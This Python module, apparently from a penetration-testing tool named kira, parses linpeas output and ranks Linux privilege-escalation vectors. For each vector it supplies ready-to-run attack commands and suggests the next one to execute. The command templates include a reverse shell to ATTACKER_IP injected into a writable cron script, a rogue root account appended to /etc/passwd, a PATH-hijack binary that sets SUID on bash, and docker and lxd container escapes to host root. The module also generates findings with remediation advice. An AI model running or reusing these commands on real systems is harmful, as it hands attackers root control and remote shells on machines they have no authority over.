"""
kira/privesc.py — PrivescEngine
================================
Reads linpeas output + shell history from state.
Identifies highest-probability privilege escalation vectors,
generates step-by-step command lists, and auto-creates Findings.

Usage:
    from privesc import PrivescEngine, PrivescVector

    engine = PrivescEngine()
    vectors = engine.analyse(linpeas_output, state_manager)
    next_cmd = engine.suggest_next_cmd(vectors, shell_history)
"""

from __future__ import annotations

import re
from dataclasses import dataclass, field
from typing import Optional


# ── PrivescVector ──────────────────────────────────────────────────────────────

VALID_TECHNIQUES = (
    "sudo_nopasswd",
    "suid",
    "cron_write",
    "kernel_exploit",
    "writable_path",
    "writable_service",
    "passwd_writable",
    "capabilities",
    "docker_group",
    "lxd_group",
)


@dataclass
class PrivescVector:
    """A single privilege escalation path discovered in linpeas output."""
    technique:   str            # one of VALID_TECHNIQUES
    confidence:  float          # 0.0 – 1.0
    commands:    list[str]      # exact commands to run in order
    description: str
    cvss:        float          # estimated CVSS for this vector
    evidence:    str = ""       # raw snippet from linpeas that triggered this

    def __post_init__(self):
        self.confidence = max(0.0, min(1.0, self.confidence))
        self.cvss       = max(0.0, min(10.0, self.cvss))

    def to_finding_dict(self, target: str = "") -> dict:
        """Convert to a Finding-compatible dict for state.add_finding()."""
        return {
            "title":             f"Privilege Escalation: {self.technique.replace('_', ' ').title()}",
            "severity":          _cvss_to_severity(self.cvss),
            "port":              0,
            "service":           "local",
            "cvss":              self.cvss,
            "description":       self.description,
            "exploit_available": True,
            "remediation":       _technique_remediation(self.technique),
        }


# ── Detection rules ────────────────────────────────────────────────────────────
# Each rule: (regex_pattern, technique, confidence, cvss, description_template)

_RULES: list[tuple] = [
    # sudo NOPASSWD
    (
        r"(NOPASSWD\s*:\s*ALL|\(ALL\)\s*NOPASSWD|\(ALL : ALL\)\s*NOPASSWD)",
        "sudo_nopasswd",
        0.95,
        9.0,
        "sudo is configured with NOPASSWD for all commands — trivial root escalation.",
    ),
    (
        r"NOPASSWD\s*:\s*/usr/bin/\w+",
        "sudo_nopasswd",
        0.85,
        8.0,
        "sudo NOPASSWD configured for a specific binary — check GTFOBins for exploitation.",
    ),

    # SUID binaries (interesting ones only)
    (
        r"[-rwsr-xsr-x].*/(bash|sh|dash|python[\d.]*|perl|ruby|find|vim|vi|less|more|"
        r"cp|mv|tee|awk|nmap|env|strace|wget|curl|gcc|as|chsh|newgrp|pkexec)",
        "suid",
        0.90,
        8.5,
        "Dangerous SUID binary detected — exploitable via GTFOBins to obtain root shell.",
    ),
    (
        r"[-rwsr-xsr-x].*/(pkexec)",
        "suid",
        0.95,
        9.3,
        "pkexec SUID detected — likely vulnerable to CVE-2021-4034 (PwnKit).",
    ),

    # Writable cron scripts
    (
        r"(cron(tab)?|/etc/cron\.(daily|hourly|weekly|d)/).*(world.writable|777|666)",
        "cron_write",
        0.80,
        8.0,
        "World-writable cron script detected — can inject reverse shell for root execution.",
    ),
    (
        r"/etc/crontab.*PERMS.*\(rw",
        "cron_write",
        0.75,
        7.5,
        "/etc/crontab is writable — can modify cron jobs to execute arbitrary commands as root.",
    ),

    # Kernel exploits (version-based)
    (
        r"Linux\s+(?:version\s+)?([2-4]\.\d+\.\d+)",
        "kernel_exploit",
        0.60,
        7.8,
        "Potentially vulnerable kernel version detected — cross-reference with known LPEs.",
    ),
    (
        r"Linux\s+(?:version\s+)?(3\.(14|15|16|17|18|19)\.\d+|4\.[0-9]\.\d+)",
        "kernel_exploit",
        0.70,
        8.0,
        "Kernel version in range known to be vulnerable to Dirty COW (CVE-2016-5195) or similar LPEs.",
    ),

    # Writable PATH directories
    (
        r"(Writable folder in PATH|writable path|PATH.*777|/tmp.*PATH)",
        "writable_path",
        0.75,
        7.0,
        "Writable directory in PATH — PATH hijacking attack possible.",
    ),

    # Writable /etc/passwd
    (
        r"/etc/passwd.*777|/etc/passwd.*writable|/etc/passwd.*\(rw",
        "passwd_writable",
        0.95,
        9.8,
        "/etc/passwd is world-writable — can add new root user directly.",
    ),

    # Linux capabilities
    (
        r"cap_(setuid|sys_admin|sys_ptrace|dac_override|dac_read_search)\s*[+=]",
        "capabilities",
        0.85,
        8.5,
        "Dangerous Linux capability detected — exploitable for privilege escalation.",
    ),

    # Docker group
    (
        r"\(docker\)|groups.*docker|docker.*group",
        "docker_group",
        0.90,
        9.0,
        "User is in the docker group — can mount host filesystem via container for root access.",
    ),

    # LXD/LXC group
    (
        r"\(lxd\)|\(lxc\)|groups.*lxd|lxd.*group",
        "lxd_group",
        0.85,
        8.8,
        "User is in the lxd group — can exploit LXD container to obtain root on host.",
    ),
]


# ── Command templates ──────────────────────────────────────────────────────────

_COMMANDS: dict[str, list[str]] = {
    "sudo_nopasswd": [
        "sudo -l",
        "sudo /bin/bash -i",
        "sudo su -",
    ],
    "suid": [
        "find / -perm -4000 -type f 2>/dev/null",
        "# Check GTFOBins for the specific binary found",
        "# Example: find . -exec /bin/sh -p \\; -quit",
    ],
    "cron_write": [
        "cat /etc/crontab",
        "ls -la /etc/cron.d/ /etc/cron.daily/ /etc/cron.hourly/",
        "echo 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' >> /path/to/writable_cron_script",
    ],
    "kernel_exploit": [
        "uname -a",
        "cat /proc/version",
        "searchsploit linux kernel $(uname -r | cut -d- -f1)",
        "# Compile and upload matching LPE exploit",
    ],
    "writable_path": [
        "echo $PATH",
        "find $(echo $PATH | tr ':' ' ') -writable 2>/dev/null",
        "# Create malicious binary shadowing a root-run command",
        "echo '#!/bin/bash\\nchmod +s /bin/bash' > /writable_path_dir/target_cmd",
        "chmod +x /writable_path_dir/target_cmd",
    ],
    "passwd_writable": [
        "ls -la /etc/passwd",
        "openssl passwd -1 -salt kira kirapass",
        "echo 'kiraroot:$1$kira$HASH:0:0:root:/root:/bin/bash' >> /etc/passwd",
        "su kiraroot",
    ],
    "capabilities": [
        "getcap -r / 2>/dev/null",
        "# For cap_setuid: python3 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'",
        "# For cap_sys_admin: mount namespaces escape",
    ],
    "docker_group": [
        "id",
        "docker images",
        "docker run -v /:/mnt --rm -it alpine chroot /mnt sh",
    ],
    "lxd_group": [
        "id",
        "lxc image import alpine.tar.gz --alias alpine",
        "lxc init alpine privesc -c security.privileged=true",
        "lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true",
        "lxc start privesc",
        "lxc exec privesc /bin/sh",
    ],
}


# ── PrivescEngine ──────────────────────────────────────────────────────────────

class PrivescEngine:
    """
    Analyses linpeas output and shell history to identify privilege
    escalation vectors. Returns ranked PrivescVector list.
    """

    def analyse(
        self,
        linpeas_output: str,
        state=None,         # StateManager instance — optional, used for auto-finding creation
    ) -> list[PrivescVector]:
        """
        Parse linpeas_output for escalation signals.
        If state is provided, auto-adds a Finding for each detected vector.

        Returns list of PrivescVector sorted by (confidence × cvss) descending.
        """
        if not linpeas_output or not linpeas_output.strip():
            return []

        vectors: list[PrivescVector] = []
        seen_techniques: set[str] = set()

        for pattern, technique, confidence, cvss, description in _RULES:
            matches = re.findall(pattern, linpeas_output, re.IGNORECASE | re.MULTILINE)
            if not matches:
                continue

            # Avoid duplicate techniques (keep highest-confidence one)
            if technique in seen_techniques:
                continue
            seen_techniques.add(technique)

            # Extract a short evidence snippet
            match_obj = re.search(pattern, linpeas_output, re.IGNORECASE | re.MULTILINE)
            evidence = ""
            if match_obj:
                start = max(0, match_obj.start() - 30)
                end   = min(len(linpeas_output), match_obj.end() + 80)
                evidence = linpeas_output[start:end].strip().replace("\n", " ")[:200]

            vector = PrivescVector(
                technique=technique,
                confidence=confidence,
                commands=_COMMANDS.get(technique, ["# Manual exploitation required"]),
                description=description,
                cvss=cvss,
                evidence=evidence,
            )
            vectors.append(vector)

            # Auto-create Finding in state
            if state is not None:
                try:
                    state.add_finding(vector.to_finding_dict())
                except Exception:
                    pass

        # Sort by score: confidence × cvss descending
        vectors.sort(key=lambda v: v.confidence * v.cvss, reverse=True)
        return vectors

    def suggest_next_cmd(
        self,
        vectors:       list[PrivescVector],
        shell_history: list[str] = None,
    ) -> str:
        """
        Return the single best next shell command to run.
        Skips commands already present in shell_history.

        Returns empty string if all vectors are exhausted.
        """
        if not vectors:
            return "# No escalation vectors identified — run linpeas manually"

        history_set = set(shell_history or [])
        top = vectors[0]

        for cmd in top.commands:
            if cmd.startswith("#"):
                continue                 # skip comments
            if cmd not in history_set:
                return cmd

        # All commands in top vector already run — try second-best
        for vector in vectors[1:]:
            for cmd in vector.commands:
                if not cmd.startswith("#") and cmd not in history_set:
                    return cmd

        return "# All suggested commands already executed"


# ── Helpers ────────────────────────────────────────────────────────────────────

def _cvss_to_severity(cvss: float) -> str:
    if cvss >= 9.0: return "critical"
    if cvss >= 7.0: return "high"
    if cvss >= 4.0: return "medium"
    if cvss > 0.0:  return "low"
    return "info"


def _technique_remediation(technique: str) -> str:
    remediations = {
        "sudo_nopasswd":    "Remove NOPASSWD entries from /etc/sudoers. Use specific, minimal sudo rules.",
        "suid":             "Remove SUID bit from non-essential binaries: chmod u-s /path/to/binary",
        "cron_write":       "Restrict cron script permissions: chmod 750 /etc/cron.d/*; chown root:root",
        "kernel_exploit":   "Patch the kernel to the latest stable version for this distribution.",
        "writable_path":    "Remove world-writable directories from PATH. Ensure PATH is set securely.",
        "passwd_writable":  "Immediately fix /etc/passwd permissions: chmod 644 /etc/passwd",
        "capabilities":     "Audit and remove unnecessary capabilities: setcap -r /path/to/binary",
        "docker_group":     "Remove non-admin users from the docker group. Use rootless Docker.",
        "lxd_group":        "Remove non-admin users from the lxd group.",
        "writable_service": "Restrict service file permissions. Ensure only root can write service configs.",
    }
    return remediations.get(technique, "Review and restrict the identified misconfiguration.")


# ── Smoke test ─────────────────────────────────────────────────────────────────

if __name__ == "__main__":
    FAKE_LINPEAS = """
    ╔══════════╣ Sudo version
    sudo version 1.8.31

    ╔══════════╣ We can sudo without password!
    Matching Defaults entries for www-data on target:
    (ALL) NOPASSWD: ALL

    ╔══════════╣ SUID - Check easy privesc, exploits and write perms
    -rwsr-xr-x 1 root root 44664 Mar 22 2019 /usr/bin/pkexec

    ╔══════════╣ Interesting writable files owned by me or writable by everyone
    /etc/cron.d/cleanup  world.writable

    ╔══════════╣ Operative system
    Linux version 3.16.0-4-amd64 (debian-kernel@lists.debian.org)

    ╔══════════╣ Users with capabilities
    cap_setuid+ep /usr/bin/python3.8

    ╔══════════╣ My user
    uid=33(www-data) gid=33(www-data) groups=33(www-data),999(docker)
    """

    print("=== privesc.py smoke test ===\n")
    engine = PrivescEngine()
    vectors = engine.analyse(FAKE_LINPEAS)

    print(f"[1] Detected {len(vectors)} vectors:")
    for v in vectors:
        print(f"    [{v.technique:<18}] conf={v.confidence:.2f}  cvss={v.cvss}  — {v.description[:70]}")

    assert len(vectors) > 0, "Expected vectors from fake linpeas"
    assert vectors[0].confidence >= vectors[-1].confidence or \
           vectors[0].cvss >= vectors[-1].cvss, "Should be sorted by score"

    print("\n[2] suggest_next_cmd (no history):")
    cmd = engine.suggest_next_cmd(vectors, [])
    print(f"    → {cmd}")
    assert cmd and not cmd.startswith("#")

    print("\n[3] suggest_next_cmd (first cmd already run):")
    cmd2 = engine.suggest_next_cmd(vectors, [cmd])
    print(f"    → {cmd2}")

    print("\n[4] to_finding_dict:")
    fd = vectors[0].to_finding_dict()
    print(f"    title    = {fd['title']}")
    print(f"    severity = {fd['severity']}")
    print(f"    cvss     = {fd['cvss']}")
    assert fd["exploit_available"] is True

    print("\n[5] Empty linpeas output → []:")
    empty = engine.analyse("")
    assert empty == []
    print("    correctly returned []")

    print("\nAll tests passed.")